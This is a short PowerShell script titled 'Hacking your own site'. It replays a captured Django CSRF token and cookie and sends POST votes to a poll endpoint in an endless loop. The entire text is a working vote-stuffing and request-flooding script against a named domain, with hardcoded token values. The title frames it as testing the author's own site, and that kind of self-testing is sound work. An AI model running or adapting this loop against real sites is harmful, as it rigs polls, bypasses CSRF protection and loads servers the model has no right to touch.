Hacking your own site

$postParams = @{csrfmiddlewaretoken='Tljh4CUQpMyp5iaSF6xREL4tDdcxxLa4lJh4fg4tsSTgnJCRoa0jBLvI10pf6gGE';choice=2} #Post Params

$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    
$cookie = New-Object System.Net.Cookie 
    
$cookie.Name = "csrftoken"
$cookie.value = "fi7fruEmABbmWTr4XWaZB8XXygWKIPM6HG52C8OZDHwdekT3G0Dry8ocW39shkiG"
$cookie.Domain = "kevin.nebulacyber.com"

$session.Cookies.Add($cookie);


while(1){Invoke-WebRequest -websession $session -Uri https://kevin.nebulacyber.com/polls/1/vote/ -Method POST -Body $postParams}
